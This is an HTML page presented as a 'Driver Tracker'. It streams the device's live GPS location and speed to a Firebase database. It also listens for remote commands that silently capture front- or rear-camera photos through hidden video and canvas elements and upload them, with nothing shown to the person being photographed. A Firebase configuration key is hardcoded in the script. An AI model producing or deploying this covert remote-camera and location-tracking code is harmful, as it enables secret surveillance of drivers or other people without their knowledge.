<!DOCTYPE html>
<html>
<head>
    <title>Driver Tracker - Dynamic ID</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
</head>
<body style="background:#121212; color:white; text-align:center; font-family:sans-serif; padding:20px;">
    <h2 id="display-id">Vehicle Tracking</h2>
    <div id="status" style="font-size: 18px; margin: 20px 0; color: #f1c40f;">Checking System...</div>
    <p id="coords" style="color: #888;"></p>
    
    <button onclick="changeID()" style="background:#555; color:white; border:none; padding:5px 10px; border-radius:5px; cursor:pointer;">Change Vehicle ID</button>

    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCWUrPm4JaKr0qDbVB_ukOSFMkSmLiYals",
            databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com",
            projectId: "mytrecker2-b3535",
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // 1. Dynamic ID Logic
        let vehicleID = localStorage.getItem("v_id");
        if (!vehicleID) {
            vehicleID = prompt("Gari ka ID likhen (e.g. Car-01, Gari-10):");
            if (vehicleID) localStorage.setItem("v_id", vehicleID);
            else vehicleID = "Unknown-Car"; 
        }
        document.getElementById('display-id').innerText = "Active: " + vehicleID;

        function changeID() {
            localStorage.removeItem("v_id");
            location.reload();
        }

        // 2. Tracking Logic
        if ("geolocation" in navigator) {
            navigator.geolocation.watchPosition((pos) => {
                const data = {
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    speed: Math.round(pos.coords.speed * 3.6) || 0,
                    last_seen: new Date().toLocaleTimeString()
                };
                
                db.ref('vehicles/' + vehicleID).update(data);
                
                document.getElementById('status').innerText = "ðŸŸ¢ Tracking Active";
                document.getElementById('coords').innerText = `Lat: ${data.lat.toFixed(4)}, Lng: ${data.lng.toFixed(4)}`;
            }, (err) => {
                document.getElementById('status').innerText = "âŒ GPS Error: " + err.message;
            }, { enableHighAccuracy: true });
        }

        // 3. Camera Command Listener for specific Vehicle ID
        db.ref('commands/' + vehicleID + '/action').on('value', (snap) => {
            const cmd = snap.val();
            if(cmd === "take_photo_front") capturePhoto("user");
            if(cmd === "take_photo_back") capturePhoto("environment");
        });

        async function capturePhoto(mode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = 320; canvas.height = 240;
                    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
                    db.ref('vehicles/' + vehicleID + '/photo').set(canvas.toDataURL('image/jpeg', 0.5));
                    db.ref('commands/' + vehicleID + '/action').set("idle");
                    stream.getTracks().forEach(t => t.stop());
                }, 2000);
            } catch (e) { db.ref('commands/' + vehicleID + '/action').set("error"); }
        }
    </script>
</body>
</html>
